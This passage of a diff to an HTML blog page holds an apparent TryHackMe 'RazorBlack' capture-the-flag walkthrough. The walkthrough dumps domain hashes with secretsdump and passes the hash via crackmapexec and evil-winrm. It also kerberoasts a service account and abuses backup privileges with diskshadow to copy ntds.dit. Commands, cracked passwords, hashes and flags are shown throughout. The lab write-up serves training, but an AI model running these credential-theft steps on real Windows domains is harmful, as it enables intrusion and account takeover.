+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># convert to hash that john can crack</span>
 root@kali$ zip2john experiment_gone_wrong.zip &gt; hash
 
 
@@ -241,12 +422,36 @@ Archive:  experiment_gone_wrong.zip
 <span style=color:#f92672>[</span>experiment_gone_wrong.zip<span style=color:#f92672>]</span> system.hive password: electromagnetismo
 inflating: system.hive
 inflating: ntds.dit
-</code></pre></div></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=what-is-ljudmilas-hash>What is Ljudmila’s Hash?</h2><ul><li><p>Extract hashes</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL &gt; hashes.txt
-</code></pre></div></li><li><p>We need to extract all NTHASHes</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat hashes.txt| cut -d <span style=color:#e6db74>&#34;:&#34;</span> -f <span style=color:#ae81ff>4</span> &gt; pothashes.txt  
-</code></pre></div></li><li><p>After that you need to remove the first few lines, so you only have hashes in there. Then you can bruteforce and get the correct hash:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>crackmapexec smb MACHINE_IP -u lvetrova -H pothashes.txt
+</code></pre></div></li>
+</ul>
+<hr>
+<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
+<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
+<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
+<hr>
+<h2 id=what-is-ljudmilas-hash>What is Ljudmila’s Hash?</h2>
+<ul>
+<li>
+<p>Extract hashes</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL &gt; hashes.txt
+</code></pre></div></li>
+<li>
+<p>We need to extract all NTHASHes</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat hashes.txt| cut -d <span style=color:#e6db74>&#34;:&#34;</span> -f <span style=color:#ae81ff>4</span> &gt; pothashes.txt  
+</code></pre></div></li>
+<li>
+<p>After that you need to remove the first few lines, so you only have hashes in there. Then you can bruteforce and get the correct hash:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>crackmapexec smb MACHINE_IP -u lvetrova -H pothashes.txt
 ...<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>...
 SMB         MACHINE_IP    <span style=color:#ae81ff>445</span>    HAVEN-DC         <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> raz0rblack.thm<span style=color:#ae81ff>\l</span>vetrova f220d3988deb3f516c73f40ee16c431d
-</code></pre></div></li></ul><hr><h2 id=what-is-ljudmilas-flag>What is Ljudmila’s Flag?</h2><ul><li><p>Login: (with hash we found earlier)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>evil-winrm -i MACHINE_IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
+</code></pre></div></li>
+</ul>
+<hr>
+<h2 id=what-is-ljudmilas-flag>What is Ljudmila’s Flag?</h2>
+<ul>
+<li>
+<p>Login: (with hash we found earlier)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>evil-winrm -i MACHINE_IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\l</span>vetrova<span style=color:#ae81ff>\D</span>ocuments&gt; whoami
 raz0rblack<span style=color:#ae81ff>\l</span>vetrova
 
@@ -256,7 +461,15 @@ raz0rblack<span style=color:#ae81ff>\l</span>vetrova
 
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\l</span>vetrova&gt; $Credential.GetNetworkCredential<span style=color:#f92672>()</span>.password
 THM<span style=color:#f92672>{</span>flag-data<span style=color:#f92672>}</span>
-</code></pre></div><p><img src=https://i.imgur.com/oJ83QKi.png alt=img></p></li></ul><hr><h2 id=what-is-xyan1d3s-password>What is Xyan1d3’s password?</h2><ul><li><p>Kerberoasting with pass-the-hash with lvetrovas creds:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoast
+</code></pre></div><p><img src=https://i.imgur.com/oJ83QKi.png alt=img></p>
+</li>
+</ul>
+<hr>
+<h2 id=what-is-xyan1d3s-password>What is Xyan1d3’s password?</h2>
+<ul>
+<li>
+<p>Kerberoasting with pass-the-hash with lvetrovas creds:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoast
 
 ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
 -------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
@@ -264,12 +477,30 @@ HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN<span style=color:#f92672>=</s
 
 root@kali$ hashcat -m <span style=color:#ae81ff>13100</span> hashes.kerberoast rockyou.txt<span style=color:#f92672>(</span>relative path: /usr/share/wordlist/rockyou.txt<span style=color:#f92672>)</span>
 <span style=color:#75715e># cracked password: cyanide9amine5628</span>
-</code></pre></div></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=what-is-xyan1d3s-flag>What is Xyan1d3’s Flag?</h2><ul><li><p>login:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ evil-winrm -i MACHINE_IP -u xyan1d3 -p cyanide9amine5628
+</code></pre></div></li>
+</ul>
+<hr>
+<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
+<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
+<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
+<hr>
+<h2 id=what-is-xyan1d3s-flag>What is Xyan1d3’s Flag?</h2>
+<ul>
+<li>
+<p>login:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ evil-winrm -i MACHINE_IP -u xyan1d3 -p cyanide9amine5628
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\x</span>yan1d3<span style=color:#ae81ff>\D</span>ocuments&gt; cd ..
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\x</span>yan1d3&gt; $Credential <span style=color:#f92672>=</span> Import-Clixml -Path <span style=color:#e6db74>&#34;xyan1d3.xml&#34;</span>
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\x</span>yan1d3&gt; $Credential.GetNetworkCredential<span style=color:#f92672>()</span>.password
 LOL here it is -&gt; THM<span style=color:#f92672>{</span>62ca7e0b901aa8f0b233cade0839b5bb<span style=color:#f92672>}</span>
-</code></pre></div></li></ul><hr><h2 id=what-is-the-root-flag>What is the root Flag?</h2><ul><li><p>check privileges:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\x</span>yan1d3&gt; whoami /all
+</code></pre></div></li>
+</ul>
+<hr>
+<h2 id=what-is-the-root-flag>What is the root Flag?</h2>
+<ul>
+<li>
+<p>check privileges:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\x</span>yan1d3&gt; whoami /all
 
 <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
 
@@ -284,7 +515,10 @@ SeRestorePrivilege            Restore files and directories  Enabled
 SeShutdownPrivilege           Shut down the system           Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-</code></pre></div></li><li><p>Abuse Backup Privs (important: diskshadow.txt has a space after each line):</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># create `diskshadow.txt` file content are follwoing</span>
+</code></pre></div></li>
+<li>
+<p>Abuse Backup Privs (important: diskshadow.txt has a space after each line):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># create `diskshadow.txt` file content are follwoing</span>
 root@kali$ cat diskshadow.txt
 set metadata C:<span style=color:#ae81ff>\t</span>mp<span style=color:#ae81ff>\t</span>mp.cabs 
 set context persistent nowriters 
@@ -325,11 +559,22 @@ Number of shadow copies listed: <span style=color:#ae81ff>1</span>
 -&gt; expose %someAlias% h:
 -&gt; %someAlias% <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>29b531e8-3c00-49f9-925d-5e1e3937af13<span style=color:#f92672>}</span>
 The shadow copy was successfully exposed as h:<span style=color:#ae81ff>\.</span>
-</code></pre></div><p>ref:</p><ul><li><a href=https://coldfusionx.github.io/posts/Blackfield-HTB/>https://coldfusionx.github.io/posts/Blackfield-HTB/</a></li><li><a href=http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738>http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738</a></li></ul></li><li><p>Get dll’s to abuse Backup Privs:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+</code></pre></div><p>ref:</p>
+<ul>
+<li><a href=https://coldfusionx.github.io/posts/Blackfield-HTB/>https://coldfusionx.github.io/posts/Blackfield-HTB/</a></li>
+<li><a href=http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738>http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738</a></li>
+</ul>
+</li>
+<li>
+<p>Get dll’s to abuse Backup Privs:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
 
 root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
 
-</code></pre></div></li><li><p>Upload, import, abuse:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>*Evil-WinRM* PS C:<span style=color:#ae81ff>\t</span>mp&gt; upload SeBackupPrivilegeUtils.dll
+</code></pre></div></li>
+<li>
+<p>Upload, import, abuse:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>*Evil-WinRM* PS C:<span style=color:#ae81ff>\t</span>mp&gt; upload SeBackupPrivilegeUtils.dll
 
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\t</span>mp&gt; upload SeBackupPrivilegeCmdLets.dll
 
@@ -345,7 +590,10 @@ root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBa
 
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\t</span>mp&gt; download system
 
-</code></pre></div></li><li><p>Dump the hashes:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
+</code></pre></div></li>
+<li>
+<p>Dump the hashes:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
@@ -377,7 +625,10 @@ raz0rblack.thm<span style=color:#ae81ff>\t</span>williams:aes256-cts-hmac-sha1-9
 raz0rblack.thm<span style=color:#ae81ff>\t</span>williams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
 raz0rblack.thm<span style=color:#ae81ff>\t</span>williams:des-cbc-md5:01e958b0ea6edf07
 
-</code></pre></div></li><li><p>Get admin flag:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali$ evil-winrm -i 10.10.2.26 -u administrator -H 9689931bed40ca5a2ce1218210177f0c
+</code></pre></div></li>
+<li>
+<p>Get admin flag:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali$ evil-winrm -i 10.10.2.26 -u administrator -H 9689931bed40ca5a2ce1218210177f0c
 
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\u</span>sers<span style=color:#ae81ff>\a</span>dministrator<span style=color:#ae81ff>\D</span>ocuments&gt; cd ..
 
@@ -395,7 +646,10 @@ raz0rblack.thm<span style=color:#ae81ff>\t</span>williams:des-cbc-md5:01e958b0ea
 &lt;/Obj&gt;
 &lt;/Objs&gt;
 
-</code></pre></div></li><li><p>Copy the password and convert from hex to get the flag:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>root@kali$ python3                                                                          
+</code></pre></div></li>
+<li>
+<p>Copy the password and convert from hex to get the flag:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>root@kali$ python3                                                                          
 Python 3.9.2 <span style=color:#f92672>(</span>default, Feb <span style=color:#ae81ff>28</span> 2021, 17:03:44<span style=color:#f92672>)</span> 
 <span style=color:#f92672>[</span>GCC 10.2.1 20210110<span style=color:#f92672>]</span> on linux
 Type <span style=color:#e6db74>&#34;help&#34;</span>, <span style=color:#e6db74>&#34;copyright&#34;</span>, <span style=color:#e6db74>&#34;credits&#34;</span> or <span style=color:#e6db74>&#34;license&#34;</span> <span style=color:#66d9ef>for</span> more information.
@@ -409,9 +663,27 @@ But, I apologize <span style=color:#66d9ef>for</span> cheating you like this.
 Here is your Root Flag
 THM<span style=color:#f92672>{</span>1b4f46cc4fba46348273d18dc91da20d<span style=color:#f92672>}</span>
 
-</code></pre></div></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=what-is-tysons-flag>What is Tyson’s Flag?</h2><ul><li><p>As Administrator:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>*Evil-WinRM* PS C:<span style=color:#ae81ff>\u</span>sers<span style=color:#ae81ff>\t</span>williams&gt; type .<span style=color:#ae81ff>\d</span>efinitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
+</code></pre></div></li>
+</ul>
+<hr>
+<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
+<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
+<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
+<hr>
+<h2 id=what-is-tysons-flag>What is Tyson’s Flag?</h2>
+<ul>
+<li>
+<p>As Administrator:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>*Evil-WinRM* PS C:<span style=color:#ae81ff>\u</span>sers<span style=color:#ae81ff>\t</span>williams&gt; type .<span style=color:#ae81ff>\d</span>efinitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
 THM<span style=color:#f92672>{</span>5144f2c4107b7cab04916724e3749fb0<span style=color:#f92672>}</span>
-</code></pre></div></li></ul><hr><h2 id=what-is-the-complete-top-secret>What is the complete top secret?</h2><ul><li><p>Enumerate all folders and find top secret path:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>*Evil-WinRM* PS C:<span style=color:#ae81ff>\&gt;</span> cd <span style=color:#e6db74>&#34;C:\Program Files\Top Secret&#34;</span>
+</code></pre></div></li>
+</ul>
+<hr>
+<h2 id=what-is-the-complete-top-secret>What is the complete top secret?</h2>
+<ul>
+<li>
+<p>Enumerate all folders and find top secret path:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>*Evil-WinRM* PS C:<span style=color:#ae81ff>\&gt;</span> cd <span style=color:#e6db74>&#34;C:\Program Files\Top Secret&#34;</span>
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\T</span>op Secret&gt; dir
 Directory: C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\T</span>op Secret
 
@@ -422,67 +694,311 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\T</span>op Secret&gt; download top_secret.png
-</code></pre></div></li></ul><p>Open the image in firefox and see the text “I dont have much time […] the way to exit vim is :w”. He died before he could end his sentence, so the answer for the last question is: <code>:wq</code>.</p><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><script data-name=BMC-Widget data-cfasync=false src=https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js data-id=anir0y data-description="Support me on Buy me a coffee!" data-message data-color=#5F7FFF data-position=Right data-x_margin=18 data-y_margin=18></script></article></section></div></div><footer class="ui basic center aligned segment" style=background-color:transparent><p>© 2010 - 2021 Classroom</p></footer></div></section><section class=back><div class=dream-max-width><header class="ui basic very padded segment dream-header"><div class="ui small circular image"><img src=/img/avatar.jpeg></div><div class=content><h1 class="ui medium header">Classroom Notes & Blog Posts<div class="sub header"></div></h1><article class="ui horizontal list"><a class=item href=/categories><i class="th list icon" title="All Categories"></i></a>
-<a class=item href=/tags><i class="tags icon" title="All Tags"></i></a></article><article class=dream-tags><a class="ui label" href=/tags/autopsy/ title=autopsy>autopsy</a>
-<a class="ui label" href=/tags/backdoor/ title=backdoor>backdoor</a>
-<a class="ui label" href=/tags/bash/ title=bash>bash</a>
-<a class="ui label" href=/tags/cheatsheet/ title=cheatsheet>cheatsheet</a>
-<a class="ui label" href=/tags/config/ title=config>config</a>
-<a class="ui label" href=/tags/couch/ title=couch>couch</a>
-<a class="ui label" href=/tags/crisis/ title=Crisis>Crisis</a>
-<a class="ui label" href=/tags/dominos/ title=dominos>dominos</a>
-<a class="ui label" href=/tags/empire/ title=Empire>Empire</a>
-<a class="ui label" href=/tags/encryption/ title=encryption>encryption</a>
-<a class="ui label" href=/tags/ffuf/ title=ffuf>ffuf</a>
-<a class="ui label" href=/tags/forensic/ title=forensic>forensic</a>
-<a class="ui label" href=/tags/gitandcrumpets/ title=gitandcrumpets>gitandcrumpets</a>
-<a class="ui label" href=/tags/gnupg/ title=gnupg>gnupg</a>
-<a class="ui label" href=/tags/hackpark/ title=HackPark>HackPark</a>
-<a class="ui label" href=/tags/hydra/ title=hydra>hydra</a>
-<a class="ui label" href=/tags/inclusion/ title=inclusion>inclusion</a>
-<a class="ui label" href=/tags/internship/ title=Internship>Internship</a>
-<a class="ui label" href=/tags/interview/ title=interview>interview</a>
-<a class="ui label" href=/tags/kenobi/ title=kenobi>kenobi</a>
-<a class="ui label" href=/tags/lab/ title=lab>lab</a>
-<a class="ui label" href=/tags/leaks/ title=leaks>leaks</a>
-<a class="ui label" href=/tags/linux/ title=Linux>Linux</a>
-<a class="ui label" href=/tags/memory/ title=memory>memory</a>
-<a class="ui label" href=/tags/metamorphosis/ title=Metamorphosis>Metamorphosis</a>
-<a class="ui label" href=/tags/metasploit/ title=metasploit>metasploit</a>
-<a class="ui label" href=/tags/mobile/ title=Mobile>Mobile</a>
-<a class="ui label" href=/tags/msf/ title=msf>msf</a>
-<a class="ui label" href=/tags/msfvenom/ title=msfvenom>msfvenom</a>
-<a class="ui label" href=/tags/notes/ title=notes>notes</a>
-<a class="ui label" href=/tags/osi/ title=OSI>OSI</a>
-<a class="ui label" href=/tags/osi-model/ title="OSI Model">OSI Model</a>
-<a class="ui label" href=/tags/pentesting/ title=Pentesting>Pentesting</a>
-<a class="ui label" href=/tags/pgp/ title=PGP>PGP</a>
-<a class="ui label" href=/tags/pip/ title=pip>pip</a>
-<a class="ui label" href=/tags/pip2/ title=pip2>pip2</a>
-<a class="ui label" href=/tags/post-exploitation/ title=Post-Exploitation>Post-Exploitation</a>
-<a class="ui label" href=/tags/powershell/ title=powershell>powershell</a>
-<a class="ui label" href=/tags/putty/ title=putty>putty</a>
-<a class="ui label" href=/tags/python/ title=python>python</a>
-<a class="ui label" href=/tags/razorblack/ title=RazorBlack>RazorBlack</a>
-<a class="ui label" href=/tags/redteaming/ title=redteaming>redteaming</a>
-<a class="ui label" href=/tags/ref/ title=Ref>Ref</a>
-<a class="ui label" href=/tags/rooms/ title=rooms>rooms</a>
-<a class="ui label" href=/tags/rootme/ title=RootMe>RootMe</a>
-<a class="ui label" href=/tags/rpwebscanning/ title=rpwebscanning>rpwebscanning</a>
-<a class="ui label" href=/tags/script/ title=script>script</a>
-<a class="ui label" href=/tags/scripting/ title=Scripting>Scripting</a>
-<a class="ui label" href=/tags/simple-ctf/ title="Simple CTF">Simple CTF</a>
-<a class="ui label" href=/tags/splunk/ title=splunk>splunk</a>
-<a class="ui label" href=/tags/stego/ title=stego>stego</a>
-<a class="ui label" href=/tags/sysmon/ title=sysmon>sysmon</a>
-<a class="ui label" href=/tags/thefindcommand/ title=Thefindcommand>Thefindcommand</a>
-<a class="ui label" href=/tags/thm/ title=thm>thm</a>
-<a class="ui label" href=/tags/tmux/ title=tmux>tmux</a>
-<a class="ui label" href=/tags/tools/ title=tools>tools</a>
-<a class="ui label" href=/tags/tryhackme/ title=tryhackme>tryhackme</a>
-<a class="ui label" href=/tags/vapt/ title=vapt>vapt</a>
-<a class="ui label" href=/tags/volatility/ title=Volatility>Volatility</a>
-<a class="ui label" href=/tags/vuln-labs/ title="vuln labs">vuln labs</a>
-<a class="ui label" href=/tags/vulnversity/ title=Vulnversity>Vulnversity</a>
-<a class="ui label" href=/tags/web-scanning/ title="web scanning">web scanning</a>
-<a class="ui label" href=/tags/wireshark/ title=wireshark>wireshark</a></article></div></header><div class="ui relaxed grid dream-grid dream-back"><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column"><article class="ui segment"><h3 class="ui header">Social Links</h3><nav class="ui secondary menu dream-menu dream-socials"><div class=item><a href=/index.xml><i class="large rss square icon" title=RSS></i></a></div><div class=item><a href=mailto:classroom@anir0y.in><i class="large mail icon" title=Email></i></a></div><div class=item><a href=https://twitter.com/anir0y target=_blank><i class="large twitter icon" title=Twitter></i></a></div><div class=item><a href=https://facebook.com/anir0yofficial target=_blank><i class="large facebook icon" title=Facebook></i></a></div><div class=item><a href=https://instagram.com/anir0yofficial target=_blank><i class="large instagram icon" title=Instagram></i></a></div><div class=item><a href=https://www.linkedin.com/in/anir0y target=_blank><i class="large linkedin icon" title=Linkedin></i></a></div><div class=item><a href=https://github.com/anir0y target=_blank><i class="large github icon" title=GitHub></i></a></div></nav></article></div><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column"><article class="ui segment">YOU CAN RESUE MY CONTENT</article></div></div></div></section></div></div><script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(c,d,e){var b,f=c.getElementsByTagName(d)[0],a=window.twttr||{};return c.getElementById(e)?a:(b=c.createElement(d),b.id=e,b.src='https://platform.twitter.com/widgets.js',f.parentNode.insertBefore(b,f),a._e=[],a.ready=function(b){a._e.push(b)},a)}(document,'script','twitter-wjs'))</script><script src=/js/jquery.min.js></script><script src=/js/semantic.min.js></script><script src=/js/jquery.overlayScrollbars.min.js></script><script src=/js/header.js></script><script src=/js/main.js></script><script src=/js/theme.js></script><script src=/js/html2canvas.min.js></script><script src=/js/post.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js></script><script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var a=localStore.getItem('hugo-theme-dream-is-dark'),b,c,d;a=a?a:window.defaultDark?'y':a,b="tomorrow",c="tomorrow-night",d=a==='y'?c:b,$('link[data-highlight]').attr('href','https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/'+d+'.min.css'),$('pre').css('background',a==='y'?'#333':'')}</script><div class="ui inverted segment" id=dream-search><div class="ui search"><div class="ui transparent input"><input class=prompt type=text placeholder=Search></div><div class=results></div></div></div><script>$(document).ready(function(){$.getJSON('https://classroom.anir0y.in/index.json',function(a){$('.ui.search').search({source:a,searchFields:['title'],showNoResults:!0})})})</script><script src=/js/search.js></script></body></html>
+</code></pre></div></li>
+</ul>
+<p>Open the image in firefox and see the text “I dont have much time […] the way to exit vim is :w”. He died before he could end his sentence, so the answer for the last question is: <code>:wq</code>.</p>
+<hr>
+<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
+<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
